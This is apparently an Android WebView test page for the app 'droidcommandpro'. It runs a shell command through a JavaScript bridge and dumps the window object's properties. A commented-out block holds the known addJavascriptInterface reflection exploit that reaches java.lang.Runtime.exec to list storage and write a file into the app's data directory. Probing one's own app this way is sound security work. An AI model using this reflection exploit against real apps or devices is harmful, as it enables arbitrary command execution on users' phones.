<script type="text/javascript">
/*  References:
    https://developer.mozilla.org/en-US/docs/Web/API/Window
    https://chromium.googlesource.com/chromium/+/trunk/android_webview/
*/
    //inject(window, logFnCall);

    window.document.write("Running javascript in webkit!<br>");
    window.document.write("Running system command...<br>");
    var res = jsinterface.runCommand("id");
    window.document.write("Results:<br>");
    window.document.write("<b>" + res + "<b><br>");
    debugger;

window.webkitStorageInfo.requestQuota(
            window.PERSISTENT,
            1000,
            function( bytes ) {
                alert( "Quota is available: " + bytes );
            },
            function( e ) {
                alert( "Error allocating quota: " + e );
            }

);

    function getAllMethods(object) {
        return Object.getOwnPropertyNames(object).filter(function(property) {
            return typeof object[property] == 'function';
        });
    }

    function splitToConsole(k) {
        var i,j,temparray,chunk = 50;
        for (i=0,j=k.length; i<j; i+=chunk) {
            temparray = k.slice(i,i+chunk);
            console.log(temparray);
        }
    }

    for(var b in window) {
        if(window.hasOwnProperty(b)) console.log(b+" = "+window[b]);
     }

    console.log("window object type: " + Object.prototype.toString.call(window));
    console.log("---DUMPING WINDOW METHODS---");
    splitToConsole(getAllMethods(window));
    console.log("---DUMPING " + Object.keys(window).length + " WINDOW KEYS---");
    splitToConsole(Object.keys(window));



function inject(obj, beforeFn) {
    for (let propName of Object.getOwnPropertyNames(obj)) {
        let prop = obj[propName];
        if (Object.prototype.toString.call(prop) === '[object Function]') {
            obj[propName] = (function(fnName) {
                return function() {
                    beforeFn.call(this, fnName, arguments);
                    return prop.apply(this, arguments);
                }
            })(propName);
        }
    }
}

function logFnCall(name, args) {
    console.log(name + " args.length of " + args.length);
    if (args.length > 0) {
        console.log(args[0]);
    }
    /*
    let s = name + '(';
    for (let i = 0; i < args.length; i++) {
        if (i > 0)
            s += ', ';
        s += String(args[i]);
    }
    s += ')';
    console.log(s);
    */
}


</script>


/*
function logFnCall(name, args) {
let s = name + '(';
for (let i = 0; i < args.length; i++) {
if (i > 0)
s += ', ';
s += String(args[i]);
}
s += ')';
console.log(s);
}
      console.log(getAllMethods(jsinterface));
      function getContents(inputStream)l
       {
        var contents = "";
        var b = inputStream.read();
        var i = 1;
        while(b != -1) {
            var bString = String.fromCharCode(b);
            contents += bString;
            b = inputStream.read();
        }
        return contents;
       }
      function execute2(cmd){
        console.log("inside execute2()");
        return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
        jsinterface.showToast("leaving execute2()");
      }
      var p = execute(["ls","/mnt/sdcard/"]);
      jsinterface.showToast(getContents(p.getInputStream()));
      execute(['/system/bin/sh','-c','echo \"mwr\" > //data/data/net.kwatts.android.droidcommandpro/cache/mwr.txt']);
*/
